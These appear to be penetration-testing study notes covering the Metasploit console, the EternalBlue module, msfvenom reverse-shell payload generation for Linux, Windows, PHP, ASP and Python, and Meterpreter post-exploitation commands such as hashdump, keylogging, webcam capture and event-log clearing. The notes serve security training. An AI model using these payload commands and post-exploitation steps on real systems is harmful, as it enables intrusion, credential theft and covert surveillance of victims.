### Metasploit
Metasploit is the most widely used exploitation framework. Metasploit is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

The Metasploit Framework is a set of tools that allow *information gathering*, *scanning*, *exploitation*, *exploit development*, *post-exploitation*, and more. While the primary usage of the Metasploit Framework focuses on the penetration testing domain, it is also useful for vulnerability research and exploit development.

The main components of the Metasploit Framework can be summarized as follows;
- **msfconsole**: The main command-line interface.
- **Modules**: supporting modules such as exploits, scanners, payloads, etc.
- **Tools**: Stand-alone tools that will help vulnerability research, vulnerability assessment, or penetration testing.

```
Auxiliarys - any supporting module, such as scanners, crawlers and fuzzers, can be found here.
Encoders - will allow you to encode the exploit and payload in the hope that a signature-based antivirus solution may miss them.
Evasion - modules will trydirect attempt to evade antivirus software.
NOPs - (No OPeration) do nothing, literally.
Payloads - are codes that will run on the target system.
Post modules - will be useful on the final stage of the penetration testing process listed above, post-exploitation.
```


##### commands to be used
```js
``show options` command will list all available parameters.
`set` used to set parameter value.
`set` used to clear any parameter value/ or  or clear all set parameters with the `unset all` command.
`setg` use to set values that will be used for all modules.
`unsetg` - can clear any value set with `setg`.
`check` some modules support this option. This will check if the target system is vulnerable without exploiting it.
`background` command to background the session prompt and go back to the msfconsole prompt.
`sessions` command can be used from the msfconsole prompt or any context to see the existing sessions.
`sessions -i` command followed by the desired session number used to interact  with any session.
`info` - view help for a specific module.
```


#### Metasploait Exploitation
#### **Port Scanning**
list potential port scanning modules available using the `search portscan` command.
Port scanning modules will require you to set a few options:  `show options`

**UDP service Identification**
The `scanner/discovery/udp_sweep` module will allow you to quickly identify services running over the UDP.

**SMB Scans**
auxiliary modules that allow us to scan SMB in a corporate network would be `smb_enumshares` and `smb_version`. 


#### Metasploit Database
Metasploit has a database function to simplify project management and avoid possible confusion when setting up parameter values. 
- You will first need to start the PostgreSQL database, which Metasploit will use with the following command:  `systemctl start postgresql`
- Then you will need to initialize the Metasploit Database using the `msfdb init` command.
- You can now launch `msfconsole` and check the database status using the `db_status` command.
- `workspace -h` command to list available options for the `workspace` command.
- `workspace` command lists available workspaces.
- It is possible to add a workspace using the `-a` parameter or delete a workspace using the `-d` parameter, respectively. like
	- `workspace -a <name>`
	- `workspace -d <name>`
- e.g: Nmap scan using the `db_nmap`, all results will be saved to the database.
	- `hosts -h` and `services -h` commands show available options.
	- Once the host information is stored in the database, you can use the `hosts -R` command to add this value to the RHOSTS parameter. 
	- `services` command used with the `-S` parameter will allow you to search for specific services in the environment. `services -S net`.

#### Vulnerability scanning
Metasploit allows you to quickly identify some critical vulnerabilities that could be considered as “low hanging fruit”.  The term “low hanging fruit” usually refers to easily identifiable and exploitable vulnerabilities that could potentially allow you to gain a foothold on a system and, in some cases, gain high-level privileges such as root or administrator.

#### Exploitation
e.g exploitation for ==Windows 7 Professional 7601 Service==
- use *exploit/windows/smb/ms17_010_eternalblue* module
- manipulate the **File System** using meterpreter commands. like:
		- ls, cd, pwd, search, upload < file>, download  < file>, cat ...
- dump password hashes from the SAM (Security Account Manager) database using
	- `hashdump` command


### Msfvenom
Msfvenom, which replaced Msfpayload and Msfencode, allows you to generate payloads.

Msfvenom will allow you to access all payloads available in the  Metasploit framework. Msfvenom allows you to create payloads in many different formats (PHP, exe, dll, elf, etc.) and for many different target systems (Apple, Windows, Android, Linux, etc.).

**Encoders**
e.g: `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.186.44 -f raw -e php/base64`

- *msfvenom*: This is the command-line utility within the Metasploit Framework used for generating payloads.
- *-p php/meterpreter/reverse_tcp*: Specifies the payload to generate. In this case, it's generating a PHP Meterpreter reverse TCP payload. This payload will allow you to establish a reverse TCP connection to a specified listener (LHOST) upon execution.
- *LHOST=10.10.186.44:* Specifies the IP address of the listener (the system where you want the reverse connection to be established). Replace 10.10.186.44 with the IP address of your listener.
- *-f raw:* Specifies the output format of the payload. In this case, it's set to raw format.
- *-e php/base64:* Specifies the encoder to use. Here, it's using the PHP base64 encoder. This means the generated payload will be encoded with base64, which is commonly used for obfuscation purposes.

**Other Payloads**
Based on the target system's configuration (operating system, install webserver, installed interpreter, etc.), msfvenom can be used to create payloads in almost all formats. Below are a few examples you will often use:

In all these examples, LHOST will be the IP address of your attacking machine, and LPORT will be the port on which your handler will listen.  
  
Linux Executable and Linkable Format (elf)  
`msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f elf > rev_shell.elf`  
- The .elf format is comparable to the .exe format in Windows. These are executable files for Linux. However, you may still need to make sure they have executable permissions on the target machine. For example, once you have the shell.elf file on your target machine, use the `chmod +x shell.elf `command to accord executable permissions. Once done, you can run this file by typing `./shell.elf` on the target machine command line.  
  
Windows  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
  
PHP  
`msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`  
  
ASP  
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f asp > rev_shell.asp`  
  
Python  
`msfvenom -p cmd/unix/reverse_python LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.py`  
  
All of the examples above are reverse payloads. This means you will need to have the exploit/multi/handler module listening on your attacking machine to work as a handler. You will need to set up the handler accordingly with the payload, LHOST and LPORT parameters. These values will be the same you have used when creating the msfvenom payload.


### Meterpreter
Meterpreter is an advanced, dynamically extensible payload that is used in conjunction with the Metasploit Framework.
Meterpreter provides a powerful platform for post-exploitation tasks on compromised systems. It allows an attacker to control the compromised system remotely and perform various operations, such as executing commands, accessing files, capturing keystrokes, pivoting to other systems within a network, and much more.
##### How does it work?
Meterpreter runs on the target system but is not installed on it. It runs in memory and does not write itself to the disk on the target.

Meterpreter payloads are divided into stagged and inline versions. Meterpreter has a wide range of different versions you can choose from based on your target system.
The easiest way to have an idea about available Meterpreter versions could be to list them using msfvenom:
	`msfvenom --list <type> | grep meterpreter`
Your decision on which version of Meterpreter to use will be mostly based on three factors;
- The target operating system (Is the target operating system Linux or Windows? Is it a Mac device? Is it an Android phone? etc.)
- Components available on the target system (Is Python installed? Is this a PHP website? etc.)
- Network connection types you can have with the target system (Do they allow raw TCP connections? Can you only have an HTTPS reverse connection? Are IPv6 addresses not as closely monitored as IPv4 addresses? etc.)

#### Meterpreter Commands
Typing `help` on any Meterpreter session (shown by `meterpreter>` at the prompt) will list all available commands.

Meterpreter will provide you with three primary categories of tools;
- Built-in commands
- Meterpreter tools
- Meterpreter scripting

Meterpreter has many versions, and each version may have different options available. Typing help once you have a Meterpreter session will help you quickly browse through available commands.
###### Core commands
- `background`: Backgrounds the current session
- `exit`: Terminate the Meterpreter session
- `guid`: Get the session GUID (Globally Unique Identifier)  
- `help`: Displays the help menu
- `info`: Displays information about a Post module
- `irb`: Opens an interactive Ruby shell on the current session
- `load`: Loads one or more Meterpreter extensions
- `migrate`: Allows you to migrate Meterpreter to another process
- `run`: Executes a Meterpreter script or Post module
- `sessions`: Quickly switch to another session
###### File system commands
- `cd`: Will change directory
- `ls`: Will list files in the current directory (dir will also work)
- `pwd`: Prints the current working directory
- `edit`: will allow you to edit a file
- `cat`: Will show the contents of a file to the screen
- `rm`: Will delete the specified file
- `search`: Will search for files
- `upload`: Will upload a file or directory
- `download`: Will download a file or directory
###### Networking commands
- `arp`: Displays the host ARP (Address Resolution Protocol) cache
- `ifconfig`: Displays network interfaces available on the target system  
- `netstat`: Displays the network connections
- `portfwd`: Forwards a local port to a remote service
- `route`: Allows you to view and modify the routing table

System commands
- `clearev`: Clears the event logs
- `execute`: Executes a command
- `getpid`: Shows the current process identifier
- `getuid`: Shows the user that Meterpreter is running as
- `kill`: Terminates a process
- `pkill`: Terminates processes by name
- `ps`: Lists running processes
- `reboot`: Reboots the remote computer
- `shell`: Drops into a system command shell
- `shutdown`: Shuts down the remote computer
- `sysinfo`: Gets information about the remote system, such as OS
###### Others Commands (these will be listed under different menu categories in the help menu)
- `idletime`: Returns the number of seconds the remote user has been idle
- `keyscan_dump`: Dumps the keystroke buffer
- `keyscan_start`: Starts capturing keystrokes
- `keyscan_stop`: Stops capturing keystrokes
- `screenshare`: Allows you to watch the remote user's desktop in real time
- `screenshot`: Grabs a screenshot of the interactive desktop
- `record_mic`: Records audio from the default microphone for X seconds
- `webcam_chat`: Starts a video chat
- `webcam_list`: Lists webcams
- `webcam_snap`: Takes a snapshot from the specified webcam
- `webcam_stream`: Plays a video stream from the specified webcam
- `getsystem`: Attempts to elevate your privilege to that of local system
- `hashdump`: Dumps the contents of the SAM database
Although all these commands may seem available under the help menu, they may not all work. For example, the target system might not have a webcam, or it can be running on a virtual machine without a proper desktop environment.


#### Post-Exploitation with Meterpreter
`Help` - This command will give you a list of all available commands in Meterpreter.
`getuid` - command will display the user with which Meterpreter is currently running.
`ps` command will list running processes.
`Migrating` to another process will help Meterpreter interact with it.
	To migrate to any process `migrate <PID>`
`hashdump` command will list the content of the SAM database. It stores user's passwords on Windows systems.
`search` command is useful to locate files with potentially juicy information.
`shell` command will launch a regular command-line shell on the target system. Pressing `CTRL+Z `will help you go back to the Meterpreter shell.
